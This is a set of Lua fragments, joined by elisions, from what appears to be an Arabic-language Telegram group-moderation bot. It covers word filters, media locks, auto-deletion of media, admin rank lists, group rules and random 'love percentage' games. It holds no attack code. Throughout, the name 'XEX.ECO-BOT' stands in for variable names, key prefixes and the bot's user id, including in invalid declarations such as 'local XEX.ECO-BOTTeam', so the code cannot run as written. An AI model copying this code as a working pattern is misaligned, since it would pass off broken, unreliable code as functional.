DevALS:set(XEX.ECO-BOT..'ALS:SetDescription'..msg.chat_id_..':'..msg.sender_user_id_,true)
...
DevALS:set(XEX.ECO-BOT.."ALS:SetFilters"..msg.sender_user_id_..msg.chat_id_,"add")  
return false  
end    
if DevALS:get(XEX.ECO-BOT.."ALS:SetFilters"..msg.sender_user_id_..msg.chat_id_) == "add" then
if text == 'الغاء' then 
Dev_ALS(msg.chat_id_, msg.id_, 1, '☆︙تم الغاء امر المنع', 1, 'md')
DevALS:del(XEX.ECO-BOT.."ALS:SetFilters"..msg.sender_user_id_..msg.chat_id_)  
return false  
end   
Dev_ALS(msg.chat_id_, msg.id_, 1, "☆︙تم منع الكلمه ↫ "..text, 1, 'html')
DevALS:del(XEX.ECO-BOT.."ALS:SetFilters"..msg.sender_user_id_..msg.chat_id_)  
DevALS:hset(XEX.ECO-BOT..'ALS:Filters:'..msg.chat_id_, text,'newword')
return false
end
if text and text == "الغاء منع" and msg.reply_to_message_id_ == 0 and ChCheck(msg) then       
Dev_ALS(msg.chat_id_, msg.id_, 1, "☆︙ارسل لي الكلمه الان", 1, 'md') 
DevALS:set(XEX.ECO-BOT.."ALS:SetFilters"..msg.sender_user_id_..msg.chat_id_,"del")  
return false  
end    
if DevALS:get(XEX.ECO-BOT.."ALS:SetFilters"..msg.sender_user_id_..msg.chat_id_) == "del" then   
if text == 'الغاء' then 
Dev_ALS(msg.chat_id_, msg.id_, 1, '☆︙تم الغاء امر الغاء المنع', 1, 'md')
DevALS:del(XEX.ECO-BOT.."ALS:SetFilters"..msg.sender_user_id_..msg.chat_id_)  
return false  
end   
if not DevALS:hget(XEX.ECO-BOT..'ALS:Filters:'..msg.chat_id_, text) then  
Dev_ALS(msg.chat_id_, msg.id_, 1, "☆︙الكلمه ↫ "..text.." غير ممنوعه", 1, 'html')
DevALS:del(XEX.ECO-BOT.."ALS:SetFilters"..msg.sender_user_id_..msg.chat_id_)  
else
DevALS:hdel(XEX.ECO-BOT..'ALS:Filters:'..msg.chat_id_, text)
...
local gps = DevALS:scard(XEX.ECO-BOT.."ALS:Groups") local users = DevALS:scard(XEX.ECO-BOT.."ALS:Users") 
...
local users = DevALS:scard(XEX.ECO-BOT.."ALS:Users")
...
local gps = DevALS:scard(XEX.ECO-BOT.."ALS:Groups")
...
if not DevALS:get(XEX.ECO-BOT..'Delete:Time'..msg.chat_id_..':'..msg.sender_user_id_) then  
...
DevALS:setex(XEX.ECO-BOT..'Delete:Time'..msg.chat_id_..':'..msg.sender_user_id_,300,true)
end 
end
...
local pv = DevALS:smembers(XEX.ECO-BOT.."ALS:Users")
local sendok = 0
for i = 1, #pv do
...
DevALS:srem(XEX.ECO-BOT.."ALS:Users",pv[i])
sendok = sendok + 1
end
if #pv == i then 
if sendok == 0 then
...
local group = DevALS:smembers(XEX.ECO-BOT.."ALS:Groups")
local w = 0
local q = 0
for i = 1, #group do
tdcli_function({ID='GetChat',chat_id_ = group[i]},function(arg,data)
if data and data.type_ and data.type_.channel_ and data.type_.channel_.status_ and data.type_.channel_.status_.ID == "ChatMemberStatusMember" then
DevALS:srem(XEX.ECO-BOT.."ALS:Groups",group[i]) 
tdcli_function ({ ID = "ChangeChatMemberStatus", chat_id_ = group[i], user_id_ = XEX.ECO-BOT, status_ = { ID = "ChatMemberStatusLeft" }, }, dl_cb, nil)
w = w + 1
end
...
local XEX.ECO-BOTgp2 = (w + q)
local XEX.ECO-BOTgp3 = #group - XEX.ECO-BOTgp2
if q == 0 then
XEX.ECO-BOTgp2 = ''
else
...
Dev_ALS(msg.chat_id_, msg.id_, 1,'☆︙عدد الكروبات الان ↫ { '..#group..' }'..XEX.ECO-BOTgp1..XEX.ECO-BOTgp2..'\n☆︙العدد الحقيقي الان  ↫ ( '..XEX.ECO-BOTgp3..' ) \n ', 1, 'md')
end end
end,nil)
end
return false
...
ALSmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, XEX.ECO-BOTTeam, 14, string.len(msg.sender_user_id_))
DevALS:set(XEX.ECO-BOT..'ALS:Lock:CleanNum'..msg.chat_id_,true)  
end
...
ALSmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, XEX.ECO-BOTTeam, 14, string.len(msg.sender_user_id_))
DevALS:del(XEX.ECO-BOT..'ALS:Lock:CleanNum'..msg.chat_id_) 
end
...
DevALS:set(XEX.ECO-BOT..'ALS:CleanNum'..msg.chat_id_,Num) 
end end 
if msg and DevALS:get(XEX.ECO-BOT..'ALS:Lock:CleanNum'..msg.chat_id_) then
if DevALS:get(XEX.ECO-BOT..'ALS:CleanNum'..msg.chat_id_) then CleanNum = DevALS:get(XEX.ECO-BOT..'ALS:CleanNum'..msg.chat_id_) else CleanNum = 200 end
if DevALS:scard(XEX.ECO-BOT.."ALS:cleanernum"..msg.chat_id_) >= tonumber(CleanNum) then 
local List = DevALS:smembers(XEX.ECO-BOT.."ALS:cleanernum"..msg.chat_id_)
local Del = 0
for k,v in pairs(List) do
Del = (Del + 1)
local Message = v
...
DevALS:del(XEX.ECO-BOT.."ALS:cleanernum"..msg.chat_id_)
end 
end
if CleanerNum(msg) then
if DevALS:get(XEX.ECO-BOT..'ALS:Lock:CleanNum'..msg.chat_id_) then 
if text == "التلقائي" and ChCheck(msg) or text == "عدد التلقائي" and ChCheck(msg) then 
local M = DevALS:scard(XEX.ECO-BOT.."ALS:cleanernum"..msg.chat_id_)
if M ~= 0 then
Dev_ALS(msg.chat_id_, msg.id_, 1, "☆︙عدد الميديا ↫ "..M.."\n☆︙الحذف التلقائي ↫ "..(DevALS:get(XEX.ECO-BOT..'ALS:CleanNum'..msg.chat_id_) or 200), 1, 'md') 
else
...
local XEX.ECO-BOTTeam = '☆︙اهلا عزيزي ↫ '..ALSRank(msg)..' \n☆︙تم تفعيل امسح بنجاح'
ALSmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, XEX.ECO-BOTTeam, 14, string.len(msg.sender_user_id_))
DevALS:set(XEX.ECO-BOT..'ALS:Lock:Clean'..msg.chat_id_,true)  
end
if text == "تعطيل امسح" and Constructor(msg) then
local XEX.ECO-BOTTeam = '☆︙اهلا عزيزي ↫ '..ALSRank(msg)..' \n☆︙تم تعطيل امسح بنجاح'
ALSmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, XEX.ECO-BOTTeam, 14, string.len(msg.sender_user_id_))
DevALS:del(XEX.ECO-BOT..'ALS:Lock:Clean'..msg.chat_id_) 
end
if Cleaner(msg) then
if DevALS:get(XEX.ECO-BOT..'ALS:Lock:Clean'..msg.chat_id_) then 
if text == "الميديا" and ChCheck(msg) or text == "عدد الميديا" and ChCheck(msg) then 
local M = DevALS:scard(XEX.ECO-BOT.."ALS:cleaner"..msg.chat_id_)
if M ~= 0 then
...
DevALS:del(XEX.ECO-BOT.."ALS:cleaner"..msg.chat_id_)
else
Dev_ALS(msg.chat_id_, msg.id_, 1, "☆︙لاتوجد ميديا هنا", 1, 'md') 
end end 
end
...
ALSmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, XEX.ECO-BOTTeam, 14, string.len(msg.sender_user_id_))
DevALS:set(XEX.ECO-BOT..'ALS:Lock:CleanMusic'..msg.chat_id_,true)  
end
if text == "تعطيل مسح الاغاني" and Constructor(msg) then
local XEX.ECO-BOTTeam = '☆︙اهلا عزيزي ↫ '..ALSRank(msg)..' \n☆︙تم تعطيل مسح الاغاني بنجاح'
ALSmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, XEX.ECO-BOTTeam, 14, string.len(msg.sender_user_id_))
DevALS:del(XEX.ECO-BOT..'ALS:Lock:CleanMusic'..msg.chat_id_) 
end
if CleanerMusic(msg) then
if DevALS:get(XEX.ECO-BOT..'ALS:Lock:CleanMusic'..msg.chat_id_) then 
if text == "الاغاني" and ChCheck(msg) or text == "عدد الاغاني" and ChCheck(msg) then 
local M = DevALS:scard(XEX.ECO-BOT.."ALS:cleanermusic"..msg.chat_id_)
if M ~= 0 then
...
local List = DevALS:smembers(XEX.ECO-BOT.."ALS:cleanermusic"..msg.chat_id_)
local Del = 0
for k,v in pairs(List) do
Del = (Del + 1)
local Message = v
...
DevALS:del(XEX.ECO-BOT.."ALS:cleanermusic"..msg.chat_id_)
else
Dev_ALS(msg.chat_id_, msg.id_, 1, "☆︙لاتوجد اغاني هنا", 1, 'md') 
end end end end
--     Source XEX.ECO-BOT     --
...
if DevALS:get(XEX.ECO-BOT..'ALS:Lock:EditMsgs'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","☆︙تم فتح التعديل")  
DevALS:del(XEX.ECO-BOT..'ALS:Lock:EditMsgs'..msg.chat_id_)
else
...
DevALS:del(XEX.ECO-BOT.."ALS:Lock:Bots"..msg.chat_id_)  
end end
if UnLockText[2] == "التكرار" then 
DevALS:hdel(XEX.ECO-BOT.."ALS:Spam:Group:User"..msg.chat_id_ ,"Spam:User")  
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","☆︙تم فتح التكرار")  
end
if BasicConstructor(msg) then
if UnLockText[2] == "التثبيت" then
if DevALS:get(XEX.ECO-BOT..'ALS:Lock:Pin'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","☆︙تم فتح التثبيت")  
DevALS:del(XEX.ECO-BOT..'ALS:Lock:Pin'..msg.chat_id_)
DevALS:srem(XEX.ECO-BOT.."ALS:Lock:Pinpin",msg.chat_id_)
else
...
DevALS:del(XEX.ECO-BOT..'ALS:Lock:Text'..msg.chat_id_)
else
...
DevALS:del(XEX.ECO-BOT..'ALS:Lock:Photo'..msg.chat_id_)
else
Dev_ALS(msg.chat_id_, msg.id_, 1, '☆︙الصور بالفعل مفتوحه في المجموعه', 1, 'md')
end
end
if UnLockText[2] == "الكلايش" then
if DevALS:get(XEX.ECO-BOT..'ALS:Lock:Spam'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","☆︙تم فتح الكلايش")  
DevALS:del(XEX.ECO-BOT..'ALS:Lock:Spam'..msg.chat_id_)
else
...
DevALS:del(XEX.ECO-BOT..'ALS:Lock:Join'..msg.chat_id_)
else
...
DevALS:del(XEX.ECO-BOT..'ALS:Lock:Videos'..msg.chat_id_)
else
...
DevALS:del(XEX.ECO-BOT..'ALS:Lock:Document'..msg.chat_id_)
else
...
DevALS:del(XEX.ECO-BOT..'ALS:Lock:Inline'..msg.chat_id_)
else
...
DevALS:del(XEX.ECO-BOT..'ALS:Lock:Markdown'..msg.chat_id_)
else
...
DevALS:del(XEX.ECO-BOT..'ALS:Lock:Gifs'..msg.chat_id_)
else
...
DevALS:del(XEX.ECO-BOT..'ALS:Lock:Music'..msg.chat_id_)
else
...
DevALS:del(XEX.ECO-BOT..'ALS:Lock:Voice'..msg.chat_id_)
else
...
DevALS:del(XEX.ECO-BOT..'ALS:Lock:Links'..msg.chat_id_)
else
...
DevALS:del(XEX.ECO-BOT..'ALS:Lock:Location'..msg.chat_id_)
else
...
DevALS:del(XEX.ECO-BOT..'ALS:Lock:Tags'..msg.chat_id_)
else
...
DevALS:del(XEX.ECO-BOT..'ALS:Lock:Hashtak'..msg.chat_id_)
else
...
DevALS:del(XEX.ECO-BOT..'ALS:Lock:Contact'..msg.chat_id_)
else
...
DevALS:del(XEX.ECO-BOT..'ALS:Lock:WebLinks'..msg.chat_id_)
else
...
DevALS:del(XEX.ECO-BOT..'ALS:Lock:Arabic'..msg.chat_id_)
else
...
DevALS:del(XEX.ECO-BOT..'ALS:Lock:English'..msg.chat_id_)
else
...
DevALS:del(XEX.ECO-BOT..'ALS:Lock:TagServr'..msg.chat_id_)
else
...
DevALS:del(XEX.ECO-BOT..'ALS:Lock:Stickers'..msg.chat_id_)
else
...
DevALS:del(XEX.ECO-BOT..'ALS:Lock:Forwards'..msg.chat_id_)
else
...
DevALS:set(XEX.ECO-BOT.."ALS:Lock:Bots"..msg.chat_id_,"del") DevALS:hset(XEX.ECO-BOT.."ALS:Spam:Group:User"..msg.chat_id_ ,"Spam:User","keed") 
LockList ={'ALS:Lock:Links','ALS:Lock:Contact','ALS:Lock:Forwards','ALS:Lock:Videos','ALS:Lock:Gifs','ALS:Lock:EditMsgs','ALS:Lock:Stickers','ALS:Lock:Farsi','ALS:Lock:Spam','ALS:Lock:WebLinks','ALS:Lock:Photo'}
for i,Lock in pairs(LockList) do
DevALS:set(XEX.ECO-BOT..Lock..msg.chat_id_,true)
end
...
DevALS:del(XEX.ECO-BOT..UnLock..msg.chat_id_)
end
...
DevALS:del(XEX.ECO-BOT..'ALS:Lock:Fshar'..msg.chat_id_) DevALS:del(XEX.ECO-BOT..'ALS:Lock:Taf'..msg.chat_id_) DevALS:del(XEX.ECO-BOT..'ALS:Lock:Kfr'..msg.chat_id_) 
DevALS:set(XEX.ECO-BOT.."ALS:Lock:Bots"..msg.chat_id_,"del") DevALS:hset(XEX.ECO-BOT.."ALS:Spam:Group:User"..msg.chat_id_ ,"Spam:User","keed") 
...
DevALS:set(XEX.ECO-BOT..'ALS:Lock:Fshar'..msg.chat_id_,true) DevALS:set(XEX.ECO-BOT..'ALS:Lock:Taf'..msg.chat_id_,true) DevALS:set(XEX.ECO-BOT..'ALS:Lock:Kfr'..msg.chat_id_,true) DevALS:hdel(XEX.ECO-BOT.."ALS:Spam:Group:User"..msg.chat_id_ ,"Spam:User") 
...
DevALS:set(XEX.ECO-BOT..'ALS:Spam:Text'..msg.chat_id_,SetSpam)
...
DevALS:set(XEX.ECO-BOT.."ALS:SudoBot:Rd"..msg.chat_id_,Text)
...
DevALS:set(XEX.ECO-BOT.."ALS:BasicConstructor:Rd"..msg.chat_id_,Text)
...
DevALS:set(XEX.ECO-BOT.."ALS:Constructor:Rd"..msg.chat_id_,Text)
...
DevALS:set(XEX.ECO-BOT.."ALS:Managers:Rd"..msg.chat_id_,Text) 
...
DevALS:set(XEX.ECO-BOT.."ALS:Admins:Rd"..msg.chat_id_,Text)
...
DevALS:set(XEX.ECO-BOT.."ALS:VipMem:Rd"..msg.chat_id_,Text)
...
DevALS:set(XEX.ECO-BOT.."ALS:Cleaner:Rd"..msg.chat_id_,Text)
...
DevALS:set(XEX.ECO-BOT.."ALS:mem:Rd"..msg.chat_id_,Text)
...
DevALS:del(XEX.ECO-BOT.."ALS:mem:Rd"..msg.chat_id_)
DevALS:del(XEX.ECO-BOT.."ALS:Cleaner:Rd"..msg.chat_id_)
DevALS:del(XEX.ECO-BOT.."ALS:VipMem:Rd"..msg.chat_id_)
DevALS:del(XEX.ECO-BOT.."ALS:Admins:Rd"..msg.chat_id_)
DevALS:del(XEX.ECO-BOT.."ALS:Managers:Rd"..msg.chat_id_)
DevALS:del(XEX.ECO-BOT.."ALS:Constructor:Rd"..msg.chat_id_)
DevALS:del(XEX.ECO-BOT.."ALS:BasicConstructor:Rd"..msg.chat_id_)
DevALS:del(XEX.ECO-BOT.."ALS:SudoBot:Rd"..msg.chat_id_)
end
end
--     Source XEX.ECO-BOT     --
...
if tonumber(admins[i].user_id_) ~= tonumber(XEX.ECO-BOT) then
...
DevALS:del(XEX.ECO-BOT..'ALS:Owner:'..msg.chat_id_)
end
end
if Owner(msg) then
if txts[2] == 'المنشئين الاساسيين' or txtss[2] == 'المنشئين الاساسيين' then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","☆︙تم حذف المنشئين الاساسيين")  
DevALS:del(XEX.ECO-BOT..'ALS:BasicConstructor:'..msg.chat_id_)
end
end
if BasicConstructor(msg) then
if txts[2] == 'المنشئين' or txtss[2] == 'المنشئين' then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","☆︙تم حذف المنشئين")  
DevALS:del(XEX.ECO-BOT..'ALS:Constructor:'..msg.chat_id_)
end end
if Constructor(msg) then
if txts[2] == 'المدراء' or txtss[2] == 'المدراء' then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","☆︙تم حذف المدراء")  
DevALS:del(XEX.ECO-BOT..'ALS:Managers:'..msg.chat_id_)
end 
...
DevALS:srem(XEX.ECO-BOT..'ALS:Tkeed:'..msg.chat_id_, v)
end 
...
DevALS:del(XEX.ECO-BOT..'ALS:Filters:'..msg.chat_id_)
DevALS:del(XEX.ECO-BOT.."ALS:FilterAnimation"..msg.chat_id_)
DevALS:del(XEX.ECO-BOT.."ALS:FilterPhoto"..msg.chat_id_)
DevALS:del(XEX.ECO-BOT.."ALS:FilterSteckr"..msg.chat_id_)
end
...
DevALS:del(XEX.ECO-BOT..'ALS:Ban:'..msg.chat_id_) DevALS:del(XEX.ECO-BOT..'ALS:Admins:'..msg.chat_id_) DevALS:del(XEX.ECO-BOT..'User:Donky:'..msg.chat_id_) DevALS:del(XEX.ECO-BOT..'ALS:VipMem:'..msg.chat_id_) DevALS:del(XEX.ECO-BOT..'ALS:Filters:'..msg.chat_id_) DevALS:del(XEX.ECO-BOT..'ALS:Muted:'..msg.chat_id_)
...
local basicconstructor = DevALS:smembers(XEX.ECO-BOT..'ALS:BasicConstructor:'..msg.chat_id_)
local constructor = DevALS:smembers(XEX.ECO-BOT..'ALS:Constructor:'..msg.chat_id_)
local Managers = DevALS:smembers(XEX.ECO-BOT..'ALS:Managers:'..msg.chat_id_)
local admins = DevALS:smembers(XEX.ECO-BOT..'ALS:Admins:'..msg.chat_id_)
local vipmem = DevALS:smembers(XEX.ECO-BOT..'ALS:VipMem:'..msg.chat_id_)
local donky = DevALS:smembers(XEX.ECO-BOT..'User:Donky:'..msg.chat_id_)
...
spam_c = DevALS:get(XEX.ECO-BOT..'ALS:Spam:Text'..msg.chat_id_)
end
--     Source XEX.ECO-BOT     --
if DevALS:hget(XEX.ECO-BOT.."ALS:Spam:Group:User"..msg.chat_id_, "Spam:User") == "kick" then     
flood = "بالطرد"     
elseif DevALS:hget(XEX.ECO-BOT.."ALS:Spam:Group:User"..msg.chat_id_,"Spam:User") == "keed" then     
flood = "بالتقيد"     
elseif DevALS:hget(XEX.ECO-BOT.."ALS:Spam:Group:User"..msg.chat_id_,"Spam:User") == "mute" then     
flood = "بالكتم"           
elseif DevALS:hget(XEX.ECO-BOT.."ALS:Spam:Group:User"..msg.chat_id_,"Spam:User") == "del" then     
flood = "بالحذف"
else     
flood = "مفتوح"     
end
--     Source XEX.ECO-BOT     --
if DevALS:get(XEX.ECO-BOT.."ALS:Lock:Bots"..msg.chat_id_) == "del" then
lock_bots = "بالحذف"
elseif DevALS:get(XEX.ECO-BOT.."ALS:Lock:Bots"..msg.chat_id_) == "ked" then
lock_bots = "بالتقيد"   
elseif DevALS:get(XEX.ECO-BOT.."ALS:Lock:Bots"..msg.chat_id_) == "kick" then
lock_bots = "بالطرد"    
else
lock_bots = "مفتوحه"    
end
--     Source XEX.ECO-BOT     --
if DevALS:get(XEX.ECO-BOT..'ALS:Lock:Text'..msg.chat_id_) then mute_text = 'مقفله' else mute_text = 'مفتوحه'end
if DevALS:get(XEX.ECO-BOT..'ALS:Lock:Photo'..msg.chat_id_) then mute_photo = 'مقفله' else mute_photo = 'مفتوحه' end
if DevALS:get(XEX.ECO-BOT..'ALS:Lock:Videos'..msg.chat_id_) then mute_video = 'مقفله' else mute_video = 'مفتوحه' end
if DevALS:get(XEX.ECO-BOT..'ALS:Lock:Gifs'..msg.chat_id_) then mute_gifs = 'مقفله' else mute_gifs = 'مفتوحه' end
if DevALS:get(XEX.ECO-BOT..'ALS:Lock:Music'..msg.chat_id_) then mute_music = 'مقفله' else mute_music = 'مفتوحه' end
if DevALS:get(XEX.ECO-BOT..'ALS:Lock:Inline'..msg.chat_id_) then mute_in = 'مقفله' else mute_in = 'مفتوحه' end
if DevALS:get(XEX.ECO-BOT..'ALS:Lock:Voice'..msg.chat_id_) then mute_voice = 'مقفله' else mute_voice = 'مفتوحه' end
if DevALS:get(XEX.ECO-BOT..'ALS:Lock:EditMsgs'..msg.chat_id_) then mute_edit = 'مقفله' else mute_edit = 'مفتوحه' end
if DevALS:get(XEX.ECO-BOT..'ALS:Lock:Links'..msg.chat_id_) then mute_links = 'مقفله' else mute_links = 'مفتوحه' end
if DevALS:get(XEX.ECO-BOT..'ALS:Lock:Pin'..msg.chat_id_) then lock_pin = 'مقفله' else lock_pin = 'مفتوحه' end
if DevALS:get(XEX.ECO-BOT..'ALS:Lock:Stickers'..msg.chat_id_) then lock_sticker = 'مقفله' else lock_sticker = 'مفتوحه' end
if DevALS:get(XEX.ECO-BOT..'ALS:Lock:TagServr'..msg.chat_id_) then lock_tgservice = 'مقفله' else lock_tgservice = 'مفتوحه' end
if DevALS:get(XEX.ECO-BOT..'ALS:Lock:WebLinks'..msg.chat_id_) then lock_wp = 'مقفله' else lock_wp = 'مفتوحه' end
if DevALS:get(XEX.ECO-BOT..'ALS:Lock:Hashtak'..msg.chat_id_) then lock_htag = 'مقفله' else lock_htag = 'مفتوحه' end
if DevALS:get(XEX.ECO-BOT..'ALS:Lock:Tags'..msg.chat_id_) then lock_tag = 'مقفله' else lock_tag = 'مفتوحه' end
if DevALS:get(XEX.ECO-BOT..'ALS:Lock:Location'..msg.chat_id_) then lock_location = 'مقفله' else lock_location = 'مفتوحه' end
if DevALS:get(XEX.ECO-BOT..'ALS:Lock:Contact'..msg.chat_id_) then lock_contact = 'مقفله' else lock_contact = 'مفتوحه' end
if DevALS:get(XEX.ECO-BOT..'ALS:Lock:English'..msg.chat_id_) then lock_english = 'مقفله' else lock_english = 'مفتوحه' end
if DevALS:get(XEX.ECO-BOT..'ALS:Lock:Arabic'..msg.chat_id_) then lock_arabic = 'مقفله' else lock_arabic = 'مفتوحه' end
if DevALS:get(XEX.ECO-BOT..'ALS:Lock:Forwards'..msg.chat_id_) then lock_forward = 'مقفله' else lock_forward = 'مفتوحه' end
if DevALS:get(XEX.ECO-BOT..'ALS:Lock:Document'..msg.chat_id_) then lock_file = 'مقفله' else lock_file = 'مفتوحه' end
if DevALS:get(XEX.ECO-BOT..'ALS:Lock:Markdown'..msg.chat_id_) then markdown = 'مقفله' else markdown = 'مفتوحه' end
if DevALS:get(XEX.ECO-BOT..'ALS:Lock:Spam'..msg.chat_id_) then lock_spam = 'مقفله' else lock_spam = 'مفتوحه' end
if DevALS:get(XEX.ECO-BOT..'ALS:Lock:Join'..msg.chat_id_) then lock_Join = 'مقفل' else lock_Join = 'مفتوح' end
if DevALS:get(XEX.ECO-BOT.."ALS:Lock:Welcome"..msg.chat_id_) then send_welcome = 'مقفله' else send_welcome = 'مفتوحه' end
if DevALS:get(XEX.ECO-BOT..'ALS:Lock:Fshar'..msg.chat_id_) then lock_fshar = 'مفتوح' else lock_fshar = 'مقفل' end
if DevALS:get(XEX.ECO-BOT..'ALS:Lock:Kfr'..msg.chat_id_) then lock_kaf = 'مفتوح' else lock_kaf = 'مقفل' end
if DevALS:get(XEX.ECO-BOT..'ALS:Lock:Taf'..msg.chat_id_) then lock_taf = 'مفتوحه' else lock_taf = 'مقفله' end
if DevALS:get(XEX.ECO-BOT..'ALS:Lock:Farsi'..msg.chat_id_) then lock_farsi = 'مقفله' else lock_farsi = 'مفتوحه' end
local Flood_Num = DevALS:hget(XEX.ECO-BOT.."ALS:Spam:Group:User"..msg.chat_id_,"Num:Spam") or 5
--     Source XEX.ECO-BOT     --
...
local XEX.ECO-BOTTeam = '☆︙اهلا عزيزي ↫ '..ALSRank(msg)..' \n☆︙تم تفعيل ميزة انطق'
ALSmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, XEX.ECO-BOTTeam, 14, string.len(msg.sender_user_id_))
DevALS:del(XEX.ECO-BOT..'ALS:Antk:ALS'..msg.chat_id_) 
end
if text == "تعطيل انطق" and Manager(msg) and ChCheck(msg) then
local XEX.ECO-BOTTeam = '☆︙اهلا عزيزي ↫ '..ALSRank(msg)..' \n☆︙تم تعطيل ميزة انطق'
ALSmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, XEX.ECO-BOTTeam, 14, string.len(msg.sender_user_id_))
DevALS:set(XEX.ECO-BOT..'ALS:Antk:ALS'..msg.chat_id_,true)  
end
if text and text:match("^انطق (.*)$") and not DevALS:get(XEX.ECO-BOT..'ALS:Antk:ALS'..msg.chat_id_) and ChCheck(msg) then
...
--     Source XEX.ECO-BOT     --
if DevALS:get(XEX.ECO-BOT..'ALS:setrules'..msg.chat_id_..':'..msg.sender_user_id_) then 
if text == 'الغاء' then 
Dev_ALS(msg.chat_id_, msg.id_, 1, '☆︙تم الغاء حفظ قوانين المجموعه', 1, 'md')
DevALS:del(XEX.ECO-BOT..'ALS:setrules'..msg.chat_id_..':'..msg.sender_user_id_)
return false  
end 
DevALS:del(XEX.ECO-BOT..'ALS:setrules'..msg.chat_id_..':'..msg.sender_user_id_)
DevALS:set(XEX.ECO-BOT..'ALS:rules'..msg.chat_id_,text)
...
DevALS:set(XEX.ECO-BOT..'ALS:setrules'..msg.chat_id_..':'..msg.sender_user_id_,true)
end
end
if text and text:match("^القوانين$") and ChCheck(msg) then
local rules = DevALS:get(XEX.ECO-BOT..'ALS:rules'..msg.chat_id_)
...
ALSmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, XEX.ECO-BOTTeam, 14, string.len(msg.sender_user_id_))
DevALS:del(XEX.ECO-BOT..'ALS:Zrf:ALS'..msg.chat_id_) 
end
if text == "تعطيل الزخرفه" and Manager(msg) and ChCheck(msg) then
local XEX.ECO-BOTTeam = '☆︙اهلا عزيزي ↫ '..ALSRank(msg)..' \n☆︙تم تعطيل الزخرفه بنجاح'
ALSmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, XEX.ECO-BOTTeam, 14, string.len(msg.sender_user_id_))
DevALS:set(XEX.ECO-BOT..'ALS:Zrf:ALS'..msg.chat_id_,true)  
end
if DevALS:get(XEX.ECO-BOT..'Zrf:ALS'..msg.chat_id_..msg.sender_user_id_) then 
if text and text == 'الغاء' then 
Dev_ALS(msg.chat_id_, msg.id_, 1, '☆︙تم الغاء امر الزخرفه', 1, 'md')
DevALS:del(XEX.ECO-BOT..'Zrf:ALS'..msg.chat_id_..msg.sender_user_id_)
return false  
end 
...
if not DevALS:get(XEX.ECO-BOT..'ALS:Zrf:ALS'..msg.chat_id_) then
if text == 'زخرفه' and ChCheck(msg) or text == 'الزخرفه' and ChCheck(msg) then  
DevALS:setex(XEX.ECO-BOT.."Zrf:ALS"..msg.chat_id_..msg.sender_user_id_,300,true)
...
ALSmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, XEX.ECO-BOTTeam, 14, string.len(msg.sender_user_id_))
DevALS:del(XEX.ECO-BOT..'ALS:Brg:ALS'..msg.chat_id_) 
end
if text == "تعطيل الابراج" and Manager(msg) and ChCheck(msg) then
local XEX.ECO-BOTTeam = '☆︙اهلا عزيزي ↫ '..ALSRank(msg)..' \n☆︙تم تعطيل الابراج بنجاح'
ALSmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, XEX.ECO-BOTTeam, 14, string.len(msg.sender_user_id_))
DevALS:set(XEX.ECO-BOT..'ALS:Brg:ALS'..msg.chat_id_,true)  
end
if not DevALS:get(XEX.ECO-BOT..'ALS:Brg:ALS'..msg.chat_id_) then
...
ALSmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, XEX.ECO-BOTTeam, 14, string.len(msg.sender_user_id_))
DevALS:del(XEX.ECO-BOT..'ALS:Nsba:ALS'..msg.chat_id_) 
end
...
ALSmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, XEX.ECO-BOTTeam, 14, string.len(msg.sender_user_id_))
DevALS:set(XEX.ECO-BOT..'ALS:Nsba:ALS'..msg.chat_id_,true)  
end
if not DevALS:get(XEX.ECO-BOT..'ALS:Nsba:ALS'..msg.chat_id_) then
if text == "نسبه الحب" and ChCheck(msg) or text == "نسبة الحب" and ChCheck(msg) then
DevALS:set(XEX.ECO-BOT..'LoveNsba:ALS'..msg.chat_id_..msg.sender_user_id_,true) 
Dev_ALS(msg.chat_id_, msg.id_, 1, '☆︙قم بارسل اسمين لحساب نسبة الحب بينهما كمثال ↫ جاك و روز', 1, 'md')
end
end
if text and text ~= "نسبه الحب" and text ~= "نسبة الحب" and DevALS:get(XEX.ECO-BOT..'LoveNsba:ALS'..msg.chat_id_..msg.sender_user_id_) then
if text and text == 'الغاء' then 
Dev_ALS(msg.chat_id_, msg.id_, 1, '☆︙تم الغاء امر نسبة الحب ', 1, 'md')
DevALS:del(XEX.ECO-BOT..'LoveNsba:ALS'..msg.chat_id_..msg.sender_user_id_) 
return false 
end 
...
DevALS:set(XEX.ECO-BOT..'RyNsba:ALS'..msg.chat_id_..msg.sender_user_id_,true)
Dev_ALS(msg.chat_id_, msg.id_, 1, '☆︙قم بارسل اسمين لحساب نسبة الخيانه بينهما كمثال ↫ جاك و روز', 1, 'md')
end
end
if text and text ~= "نسبه الخيانه" and text ~= "نسبة الخيانه" and text ~= "↫ نسبه الخيانه ☆" and DevALS:get(XEX.ECO-BOT..'RyNsba:ALS'..msg.chat_id_..msg.sender_user_id_) then
if text and text == 'الغاء' then 
Dev_ALS(msg.chat_id_, msg.id_, 1, '☆︙تم الغاء امر نسبة الخيانه ', 1, 'md')
DevALS:del(XEX.ECO-BOT..'RyNsba:ALS'..msg.chat_id_..msg.sender_user_id_) 
return false 
end 
ALS = math.random(0,100);
...
DevALS:set(XEX.ECO-BOT..'JNsba:ALS'..msg.chat_id_..msg.sender_user_id_,true) 
Dev_ALS(msg.chat_id_, msg.id_, 1, '☆︙قم بارسل اسم الشخص لقياس نسبة جماله كمثال ↫ جاك او روز', 1, 'md')
end
end
if text and text ~= "نسبه الجمال" and text ~= "نسبة الجمال" and text ~= "↫ نسبه الجمال ☆" and DevALS:get(XEX.ECO-BOT..'JNsba:ALS'..msg.chat_id_..msg.sender_user_id_) then
